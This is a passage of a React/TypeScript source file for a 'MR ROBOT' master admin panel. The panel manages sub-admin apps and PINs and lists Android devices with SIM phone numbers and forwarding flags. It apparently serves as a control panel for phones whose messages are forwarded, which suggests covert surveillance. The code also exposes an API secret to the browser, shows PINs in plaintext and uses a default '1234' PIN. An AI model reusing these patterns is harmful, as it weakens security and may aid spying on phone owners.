import { useState, useEffect, useCallback } from "react";

const _API_KEY = import.meta.env.VITE_API_SECRET ?? "";
function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
  const h = new Headers(opts.headers);
  if (_API_KEY) h.set("x-api-key", _API_KEY);
  return fetch(url, { ...opts, headers: h });
}

const T = {
  bg: "#0a0f1e",
  card: "#111827",
  cardHover: "#1a2236",
  border: "#1f2d45",
  borderLight: "#263347",
  text: "#f1f5f9",
  muted: "#64748b",
  mutedLight: "#94a3b8",
  accent: "#6366f1",
  accentLight: "#818cf8",
  accentGlow: "rgba(99,102,241,0.15)",
  green: "#22c55e",
  red: "#ef4444",
  yellow: "#f59e0b",
  orange: "#f97316",
  inputBg: "#0d1526",
  headerBg: "#0d1526",
};

type App = {
  id: number; appId: string; name: string; pin: string;
  status: string; loginLimit: number; activeSessions: number; createdAt: string;
};

function generateAppId() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const seg = (n: number) => Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  return `APP-${seg(4)}-${seg(4)}-${seg(4)}`;
}

type FullDevice = {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null;
  status: string; lastOnline: string | null;
  forwardEnabled: boolean; forwardSlot: number | null;
  hasFcm: boolean; installedAt: string;
};

function fmtAgo(iso: string | null | undefined): string {
  if (!iso) return "Never";
  const diff = Date.now() - new Date(iso).getTime();
  if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return `${Math.floor(diff / 86400000)}d ago`;
}

function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard) return navigator.clipboard.writeText(text);
  const el = document.createElement("textarea");
  el.value = text;
  el.style.position = "fixed"; el.style.opacity = "0";
  document.body.appendChild(el); el.select();
  document.execCommand("copy");
  document.body.removeChild(el);
  return Promise.resolve();
}

function CopyBtn({ value, label = "Copy" }: { value: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  function handleCopy(e: React.MouseEvent) {
    e.stopPropagation();
    copyToClipboard(value).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }
  return (
    <button
      onClick={handleCopy}
      title={`Copy ${label}`}
      style={{
        display: "inline-flex", alignItems: "center", justifyContent: "center",
        padding: "3px 8px", borderRadius: 6, border: `1px solid ${copied ? T.green : T.borderLight}`,
        background: copied ? T.green + "22" : "transparent",
        color: copied ? T.green : T.mutedLight, cursor: "pointer",
        fontSize: 11, fontWeight: 600, gap: 4, transition: "all 0.15s",
        whiteSpace: "nowrap",
      }}
    >
      {copied ? "✓ Copied!" : `⎘ ${label}`}
    </button>
  );
}

/* ─────────── Login Screen ─────────── */
function MasterLogin({ onAuth }: { onAuth: (pin: string) => void }) {
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPin, setShowPin] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/admin/verify-master-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin }),
      });
      if (!r.ok) { setErr("Wrong master PIN. Try again."); setPin(""); return; }
      onAuth(pin);
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  return (
    <div style={{
      minHeight: "100vh",
      background: `radial-gradient(ellipse at 60% 20%, rgba(99,102,241,0.18) 0%, transparent 60%), radial-gradient(ellipse at 20% 80%, rgba(139,92,246,0.12) 0%, transparent 55%), ${T.bg}`,
      display: "flex", alignItems: "center", justifyContent: "center",
      fontFamily: "system-ui", padding: "20px",
    }}>
      <div style={{
        width: "100%", maxWidth: 400,
        background: T.card,
        borderRadius: 20,
        padding: "40px 36px",
        border: `1px solid ${T.borderLight}`,
        boxShadow: "0 25px 80px rgba(0,0,0,.6), 0 0 60px rgba(99,102,241,0.08)",
      }}>
        {/* Logo */}
        <div style={{ textAlign: "center", marginBottom: 32 }}>
          <div style={{
            width: 64, height: 64, borderRadius: 18, margin: "0 auto 16px",
            background: "linear-gradient(135deg, #6366f1, #8b5cf6)",
            display: "flex", alignItems: "center", justifyContent: "center",
            fontSize: 28, boxShadow: "0 8px 24px rgba(99,102,241,0.4)",
          }}>🤖</div>
          <div style={{ fontSize: 24, fontWeight: 900, color: T.text, letterSpacing: -0.5 }}>MR ROBOT</div>
          <div style={{
            display: "inline-block", marginTop: 8, fontSize: 11, color: T.accent,
            background: T.accentGlow, padding: "3px 12px", borderRadius: 99,
            border: `1px solid ${T.accent}44`, fontWeight: 700, letterSpacing: 1,
          }}>MASTER ADMIN</div>
        </div>

        <form onSubmit={handleSubmit}>
          <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.2, textTransform: "uppercase" }}>
            Master PIN
          </label>
          <div style={{ position: "relative", marginTop: 8, marginBottom: 6 }}>
            <input
              type={showPin ? "text" : "password"}
              value={pin}
              onChange={e => setPin(e.target.value)}
              placeholder="Enter master PIN"
              autoFocus
              style={{
                width: "100%", padding: "14px 44px 14px 16px",
                borderRadius: 12, border: `1.5px solid ${pin ? T.accent + "80" : T.borderLight}`,
                background: T.inputBg, color: T.text, fontSize: 15, outline: "none",
                boxSizing: "border-box", transition: "border-color 0.2s",
                fontFamily: pin && !showPin ? "monospace" : "inherit",
                letterSpacing: pin && !showPin ? 3 : "normal",
              }}
            />
            <button
              type="button"
              onClick={() => setShowPin(v => !v)}
              style={{
                position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)",
                background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 16, padding: 4,
              }}
            >{showPin ? "🙈" : "👁"}</button>
          </div>

          {err && (
            <div style={{
              display: "flex", alignItems: "center", gap: 8,
              color: T.red, fontSize: 13, marginTop: 10, marginBottom: 4,
              background: T.red + "15", padding: "8px 12px", borderRadius: 8,
              border: `1px solid ${T.red}33`,
            }}>
              <span>⚠</span> {err}
            </div>
          )}

          <button
            type="submit"
            disabled={loading || !pin}
            style={{
              width: "100%", marginTop: 20, padding: "14px 0", borderRadius: 12,
              background: pin && !loading
                ? "linear-gradient(135deg, #6366f1, #8b5cf6)"
                : T.borderLight,
              color: "#fff", fontWeight: 800, fontSize: 15, border: "none",
              cursor: pin && !loading ? "pointer" : "default",
              letterSpacing: 0.3, transition: "all 0.2s",
              boxShadow: pin && !loading ? "0 6px 20px rgba(99,102,241,0.35)" : "none",
            }}
          >
            {loading ? (
              <span style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                <span style={{ display: "inline-block", width: 14, height: 14, border: "2px solid #fff4", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
                Verifying…
              </span>
            ) : "Unlock Panel →"}
          </button>
        </form>

        <div style={{ textAlign: "center", marginTop: 20, fontSize: 11, color: T.muted }}>
          MR ROBOT Control Panel · Secure Access
        </div>
      </div>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
    </div>
  );
}

/* ─────────── Create App Modal ─────────── */
function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; onClose: () => void; onCreated: (a: App) => void }) {
  const [name, setName] = useState("MR ROBOT");
  const [appId, setAppId] = useState(generateAppId);
  const [pin, setPin] = useState("1234");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name.trim() || !pin.trim()) { setErr("All fields required"); return; }
    if (pin.length < 4) { setErr("PIN must be at least 4 characters"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/master/apps", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({ appId, name: name.trim(), pin }),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      const created = await r.json() as App;
      onCreated(created);
    } catch { setErr("Network error"); }
    finally { setLoading(false); }
  }

  const inp = (extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", marginTop: 6, padding: "11px 14px", borderRadius: 10,
    border: `1.5px solid ${T.borderLight}`, background: T.inputBg,
    color: T.text, fontSize: 14, outline: "none", boxSizing: "border-box",
    ...extra,
  });

  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.75)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ width: "100%", maxWidth: 420, background: T.card, borderRadius: 18, padding: "28px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 20px 60px rgba(0,0,0,.5)" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 22 }}>
          <div style={{ fontSize: 18, fontWeight: 800, color: T.text }}>Create New Sub-Admin App</div>
          <button onClick={onClose} style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 20, padding: "2px 6px", borderRadius: 6 }}>✕</button>
        </div>
        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: 14 }}>
            <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase" }}>App Name</label>
            <input type="text" value={name} onChange={e => setName(e.target.value)} placeholder="e.g. Team Alpha" style={inp()} />
          </div>
          <div style={{ marginBottom: 14 }}>
            <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase" }}>App ID</label>
            <div style={{ display: "flex", gap: 6, marginTop: 6 }}>
              <input type="text" value={appId} onChange={e => setAppId(e.target.value)}
                style={{ ...inp(), marginTop: 0, flex: 1, fontFamily: "monospace", fontSize: 13 }} />
              <button type="button" onClick={() => setAppId(generateAppId())}
                style={{ padding: "11px 14px", borderRadius: 10, background: T.borderLight, border: "none", color: T.text, cursor: "pointer", fontSize: 14, fontWeight: 700 }}>↺</button>
            </div>
          </div>
          <div style={{ marginBottom: 14 }}>
            <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase" }}>Login PIN</label>
            <input type="password" value={pin} onChange={e => setPin(e.target.value)} placeholder="min 4 characters" style={inp()} />
          </div>
          {err && <div style={{ color: T.red, fontSize: 13, marginBottom: 10, background: T.red + "15", padding: "8px 12px", borderRadius: 8 }}>{err}</div>}
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button type="button" onClick={onClose}
              style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.borderLight, border: "none", color: T.text, fontWeight: 700, cursor: "pointer" }}>Cancel</button>
            <button type="submit" disabled={loading}
              style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", boxShadow: "0 4px 14px rgba(99,102,241,0.3)" }}>
              {loading ? "Creating…" : "Create App"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

/* ─────────── Change Master PIN Modal ─────────── */
function ChangePinModal({ masterPin, onClose, onChanged }: { masterPin: string; onClose: () => void; onChanged: (p: string) => void }) {
  const [currentPin, setCurrentPin] = useState(masterPin);
  const [newPin, setNewPin] = useState("");
  const [newPin2, setNewPin2] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (newPin.length < 4) { setErr("New PIN must be at least 4 characters"); return; }
    if (newPin !== newPin2) { setErr("PINs do not match"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/admin/master-pin", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentPin, newPin }),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onChanged(newPin);
    } catch { setErr("Network error"); }
    finally { setLoading(false); }
  }

  const inp: React.CSSProperties = {
    width: "100%", marginTop: 6, padding: "11px 14px", borderRadius: 10,
    border: `1.5px solid ${T.borderLight}`, background: T.inputBg,
    color: T.text, fontSize: 14, outline: "none", boxSizing: "border-box",
  };

  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.75)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ width: "100%", maxWidth: 380, background: T.card, borderRadius: 18, padding: "28px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 20px 60px rgba(0,0,0,.5)" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 22 }}>
          <div style={{ fontSize: 18, fontWeight: 800, color: T.text }}>Change Master PIN</div>
          <button onClick={onClose} style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 20, padding: "2px 6px", borderRadius: 6 }}>✕</button>
        </div>
        <form onSubmit={handleSubmit}>
          {[
            { label: "Current PIN", val: currentPin, set: setCurrentPin },
            { label: "New PIN", val: newPin, set: setNewPin },
            { label: "Confirm New PIN", val: newPin2, set: setNewPin2 },
          ].map(({ label, val, set }) => (
            <div key={label} style={{ marginBottom: 12 }}>
              <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase" }}>{label}</label>
              <input type="password" value={val} onChange={e => set(e.target.value)} style={inp} />
            </div>
          ))}
          {err && <div style={{ color: T.red, fontSize: 13, marginBottom: 10, background: T.red + "15", padding: "8px 12px", borderRadius: 8 }}>{err}</div>}
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button type="button" onClick={onClose}
              style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.borderLight, border: "none", color: T.text, fontWeight: 700, cursor: "pointer" }}>Cancel</button>
            <button type="submit" disabled={loading}
              style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer" }}>
              {loading ? "Saving…" : "Change PIN"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

/* ─────────── Edit App Modal ─────────── */
function EditAppModal({ app, masterPin, onClose, onUpdated }: { app: App; masterPin: string; onClose: () => void; onUpdated: (a: App) => void }) {
  const [name, setName] = useState(app.name);
  const [pin, setPin] = useState(app.pin);
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name.trim()) { setErr("Name required"); return; }
    if (pin.length < 4) { setErr("PIN must be at least 4 characters"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({ name: name.trim(), pin }),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      const updated = await r.json() as App;
      onUpdated({ ...updated, activeSessions: app.activeSessions });
    } catch { setErr("Network error"); }
    finally { setLoading(false); }
  }

  const inp: React.CSSProperties = {
    width: "100%", marginTop: 6, padding: "11px 14px", borderRadius: 10,
    border: `1.5px solid ${T.borderLight}`, background: T.inputBg,
    color: T.text, fontSize: 14, outline: "none", boxSizing: "border-box",
  };

  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.75)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ width: "100%", maxWidth: 420, background: T.card, borderRadius: 18, padding: "28px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 20px 60px rgba(0,0,0,.5)" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 6 }}>
          <div style={{ fontSize: 18, fontWeight: 800, color: T.text }}>Edit App</div>
          <button onClick={onClose} style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 20, padding: "2px 6px", borderRadius: 6 }}>✕</button>
        </div>
        <div style={{ fontSize: 12, color: T.muted, marginBottom: 22, fontFamily: "monospace", background: T.inputBg, padding: "5px 10px", borderRadius: 6, display: "inline-block" }}>{app.appId}</div>
        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: 14 }}>
            <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase" }}>App Name</label>
            <input type="text" value={name} onChange={e => setName(e.target.value)} style={inp} />
          </div>
          <div style={{ marginBottom: 14 }}>
            <label style={{ fontSize: 11, color: T.mutedLight, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase" }}>Login PIN</label>
            <input type="text" value={pin} onChange={e => setPin(e.target.value)} style={{ ...inp, fontFamily: "monospace" }} />
          </div>
          {err && <div style={{ color: T.red, fontSize: 13, marginBottom: 10, background: T.red + "15", padding: "8px 12px", borderRadius: 8 }}>{err}</div>}
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button type="button" onClick={onClose}
              style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.borderLight, border: "none", color: T.text, fontWeight: 700, cursor: "pointer" }}>Cancel</button>
            <button type="submit" disabled={loading}
              style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer" }}>
              {loading ? "Saving…" : "Save Changes"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

/* ─────────── App Card ─────────── */
function AppCard({
  app, masterPin,
  onEdit, onDelete, onToggle, onLogoutAll, onCopyUrl,
  copyMsg, deletingId, togglingId, logoutAllId,
}: {
  app: App; masterPin: string;
  onEdit: (a: App) => void;
  onDelete: (a: App) => void;
  onToggle: (a: App) => void;
  onLogoutAll: (a: App) => void;
  onCopyUrl: (a: App) => void;
  copyMsg: Record<string, string>;
  deletingId: string | null;
  togglingId: string | null;
  logoutAllId: string | null;
}) {
  const isActive = app.status === "active";
  const dateStr = new Date(app.createdAt).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });

  return (
    <div style={{
      background: T.card,
      borderRadius: 14,
      border: `1px solid ${T.borderLight}`,
      overflow: "hidden",
      transition: "box-shadow 0.2s",
    }}
      onMouseEnter={e => { (e.currentTarget as HTMLDivElement).style.boxShadow = "0 4px 20px rgba(99,102,241,0.1)"; }}
      onMouseLeave={e => { (e.currentTarget as HTMLDivElement).style.boxShadow = "none"; }}
    >
      {/* Card top bar — status indicator */}
      <div style={{ height: 3, background: isActive ? `linear-gradient(90deg,${T.green},#4ade80)` : T.red, opacity: 0.8 }} />

      <div style={{ padding: "16px 18px" }}>
        {/* Top row: name + status badge */}
        <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12, marginBottom: 12 }}>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
              <div style={{ fontSize: 16, fontWeight: 800, color: T.text, wordBreak: "break-word" }}>{app.name}</div>
              <span style={{
                fontSize: 10, fontWeight: 700, padding: "2px 9px", borderRadius: 99,
                color: isActive ? T.green : T.red,
                background: (isActive ? T.green : T.red) + "20",
                border: `1px solid ${(isActive ? T.green : T.red)}44`,
              }}>
                {isActive ? "● Active" : "○ Disabled"}
              </span>
            </div>
            <div style={{ fontSize: 11, color: T.muted, marginTop: 3 }}>Created {dateStr}</div>
          </div>
        </div>

        {/* Info rows */}
        <div style={{
          background: T.inputBg, borderRadius: 10, padding: "10px 14px",
          marginBottom: 14, display: "flex", flexDirection: "column", gap: 8,
        }}>
          {/* App ID row */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
            <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, letterSpacing: 0.8, textTransform: "uppercase", minWidth: 34 }}>ID</span>
            <span style={{ fontSize: 12, color: T.accentLight, fontFamily: "monospace", fontWeight: 600, flex: 1, wordBreak: "break-all" }}>{app.appId}</span>
            <CopyBtn value={app.appId} label="ID" />
          </div>
          {/* PIN row */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
            <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, letterSpacing: 0.8, textTransform: "uppercase", minWidth: 34 }}>PIN</span>
            <span style={{ fontSize: 12, color: T.text, fontFamily: "monospace", letterSpacing: 3, flex: 1 }}>{app.pin}</span>
            <CopyBtn value={app.pin} label="PIN" />
          </div>
        </div>

        {/* Action buttons */}
        <div style={{ display: "flex", gap: 7, flexWrap: "wrap" }}>
          {/* Copy URL */}
          <button onClick={() => onCopyUrl(app)}
            style={{ padding: "7px 13px", borderRadius: 8, background: copyMsg[app.appId] ? T.green + "22" : T.borderLight, border: `1px solid ${copyMsg[app.appId] ? T.green + "44" : "transparent"}`, color: copyMsg[app.appId] ? T.green : T.mutedLight, fontWeight: 600, fontSize: 12, cursor: "pointer", whiteSpace: "nowrap" }}>
            {copyMsg[app.appId] || "📋 URL"}
          </button>

          {/* Edit */}
          <button onClick={() => onEdit(app)}
            style={{ padding: "7px 13px", borderRadius: 8, background: T.accentGlow, border: `1px solid ${T.accent}33`, color: T.accent, fontWeight: 700, fontSize: 12, cursor: "pointer" }}>
            ✏️ Edit
          </button>

          {/* Logout All */}
          <button onClick={() => onLogoutAll(app)} disabled={logoutAllId === app.appId}
            style={{ padding: "7px 13px", borderRadius: 8, background: T.orange + "18", border: `1px solid ${T.orange}33`, color: T.orange, fontWeight: 700, fontSize: 12, cursor: logoutAllId === app.appId ? "wait" : "pointer", whiteSpace: "nowrap", opacity: logoutAllId === app.appId ? 0.5 : 1 }}>
            {logoutAllId === app.appId ? "…" : "🔓 Logout All"}
          </button>

          {/* Spacer */}
          <div style={{ flex: 1 }} />

          {/* Toggle */}
          <button onClick={() => onToggle(app)} disabled={togglingId === app.appId}
            style={{ padding: "8px 18px", borderRadius: 9, background: isActive ? T.yellow + "18" : T.green + "18", border: `1.5px solid ${isActive ? T.yellow : T.green}`, color: isActive ? T.yellow : T.green, fontWeight: 800, fontSize: 13, cursor: "pointer", whiteSpace: "nowrap" }}>
            {togglingId === app.appId ? "…" : isActive ? "⏸ Disable" : "▶ Enable"}
          </button>

          {/* Delete */}
          <button onClick={() => onDelete(app)} disabled={deletingId === app.appId}
            style={{ padding: "8px 18px", borderRadius: 9, background: T.red + "18", border: `1.5px solid ${T.red}`, color: T.red, fontWeight: 800, fontSize: 13, cursor: "pointer" }}>
            {deletingId === app.appId ? "…" : "🗑️"}
          </button>
        </div>
      </div>
    </div>
  );
}

/* ─────────── Dashboard ─────────── */
const PAGE_SIZE = 48;

function AllDevicesModal({ devices, loading, search, onSearchChange, onClose, onRefresh }: {
  devices: FullDevice[]; loading: boolean; search: string;
  onSearchChange: (v: string) => void; onClose: () => void; onRefresh: () => void;
}) {
  const [page, setPage] = useState(1);
  const [inputVal, setInputVal] = useState(search);

  // debounce: update parent search after 300ms pause
  const debRef = React.useRef<ReturnType<typeof setTimeout> | null>(null);
  function handleSearchInput(v: string) {
    setInputVal(v);
    setPage(1);
    if (debRef.current) clearTimeout(debRef.current);
    debRef.current = setTimeout(() => onSearchChange(v), 300);
  }
  function clearSearch() { setInputVal(""); onSearchChange(""); setPage(1); }

  const s = search.trim().toLowerCase();
  const filtered = React.useMemo(() => s === "" ? devices : devices.filter(d =>
    d.name.toLowerCase().includes(s) ||
    d.appId.toLowerCase().includes(s) ||
    d.deviceId.toLowerCase().includes(s) ||
    (d.sim1Phone ?? "").includes(s) ||
    (d.sim2Phone ?? "").includes(s)
  ), [devices, s]);

  const shown = filtered.slice(0, page * PAGE_SIZE);
  const hasMore = shown.length < filtered.length;
  const online = devices.filter(d => d.status === "online").length;

  const appColors: Record<string, string> = {};
  const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899","#14b8a6","#84cc16"];
  let ci = 0;
  devices.forEach(d => { if (!appColors[d.appId]) appColors[d.appId] = palette[ci++ % palette.length]; });

  function SimRow({ slot, carrier, phone }: { slot: number; carrier: string | null; phone: string | null }) {
    return (
      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
        <span style={{ fontSize: 10, fontWeight: 700, color: T.muted, background: T.border, borderRadius: 4, padding: "1px 5px", flexShrink: 0 }}>
          SIM{slot}
        </span>
        {carrier || phone ? (
          <span style={{ fontSize: 12, color: T.mutedLight }}>
            {carrier && <span style={{ color: T.text, fontWeight: 600 }}>{carrier}</span>}
            {carrier && phone && " · "}
            {phone && <span style={{ fontFamily: "monospace", color: "#93c5fd" }}>{phone}</span>}
          </span>
        ) : (
          <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>No SIM</span>
        )}
      </div>
    );
  }

  return (
    <div style={{
      position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", zIndex: 200,
      display: "flex", flexDirection: "column",
      backdropFilter: "blur(4px)",
    }}>
      {/* Header */}
      <div style={{
        background: T.headerBg, borderBottom: `1px solid ${T.border}`,
        padding: "0 16px", flexShrink: 0,
      }}>
        <div style={{ maxWidth: 960, margin: "0 auto", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1, flexWrap: "wrap" }}>
            <span style={{ fontSize: 18 }}>📱</span>
            <span style={{ fontWeight: 900, fontSize: 16, color: T.text }}>All Devices</span>
            <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 10px", fontSize: 11, fontWeight: 800, border: `1px solid ${T.accent}44` }}>
              {devices.length} total
            </span>
            <span style={{ background: "#16a34a22", color: "#4ade80", borderRadius: 99, padding: "2px 10px", fontSize: 11, fontWeight: 800, border: "1px solid #16a34a44" }}>
              {online} online
            </span>
          </div>
          <div style={{ display: "flex", gap: 6 }}>
            <button onClick={onRefresh} disabled={loading}
              style={{ background: T.borderLight, border: "none", color: loading ? T.muted : T.text, borderRadius: 8, padding: "7px 14px", fontSize: 12, fontWeight: 700, cursor: loading ? "default" : "pointer" }}>
              {loading ? "⏳" : "🔄"}
            </button>
            <button onClick={onClose} style={{ background: T.borderLight, border: "none", color: T.text, borderRadius: 8, padding: "7px 14px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>✕</button>
          </div>
        </div>
      </div>

      {/* Search */}
      <div style={{ background: T.bg, padding: "12px 16px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
        <div style={{ maxWidth: 960, margin: "0 auto", position: "relative" }}>
          <span style={{ position: "absolute", left: 12, top: "50%", transform: "translateY(-50%)", color: T.muted, fontSize: 14, pointerEvents: "none" }}>🔍</span>
          <input
            type="text" placeholder="Search by name, App ID, deviceId, phone…"
            value={inputVal} onChange={e => handleSearchInput(e.target.value)} autoFocus
            style={{
              width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 38px",
              borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`,
              color: T.text, fontSize: 13, outline: "none",
            }}
          />
          {inputVal && <button onClick={clearSearch} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 16 }}>✕</button>}
        </div>
      </div>

      {/* Device list */}
      <div style={{ flex: 1, overflowY: "auto", padding: "16px", background: T.bg }}>
        <div style={{ maxWidth: 960, margin: "0 auto" }}>
          {loading ? (
            <div style={{ textAlign: "center", padding: 80, color: T.muted }}>
              <div style={{ fontSize: 32, marginBottom: 12 }}>⏳</div>
              <div>Loading all devices…</div>
            </div>
          ) : filtered.length === 0 ? (
            <div style={{ textAlign: "center", padding: 80, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}` }}>
              <div style={{ fontSize: 32, marginBottom: 10 }}>🔍</div>
              {search ? `"${search}" se koi device nahi mila.` : "Koi device nahi hai."}
            </div>
          ) : (
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(300px, 1fr))", gap: 12 }}>
              {shown.map(d => {
                const acColor = appColors[d.appId] ?? T.accent;
                const isOnline = d.status === "online";
                return (
                  <div key={d.deviceId} style={{
                    background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`,
                    overflow: "hidden", display: "flex", flexDirection: "column",
                    boxShadow: isOnline ? `0 0 0 1px ${T.green}22 inset` : undefined,
                  }}>
                    {/* Card header */}
                    <div style={{ padding: "10px 14px", background: T.headerBg, borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0 }}>
                        <span style={{ background: acColor + "22", color: acColor, border: `1px solid ${acColor}44`, borderRadius: 6, padding: "2px 8px", fontSize: 10, fontWeight: 800, letterSpacing: 0.5, flexShrink: 0 }}>
                          {d.appId}
                        </span>
                      </div>
                      <span style={{
                        display: "flex", alignItems: "center", gap: 4,
                        background: isOnline ? "#16a34a22" : T.border,
                        color: isOnline ? "#4ade80" : T.muted,
                        borderRadius: 99, padding: "2px 9px", fontSize: 10, fontWeight: 800,
                        border: `1px solid ${isOnline ? "#16a34a44" : "transparent"}`,
                        flexShrink: 0,
                      }}>
                        <span style={{ width: 6, height: 6, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />
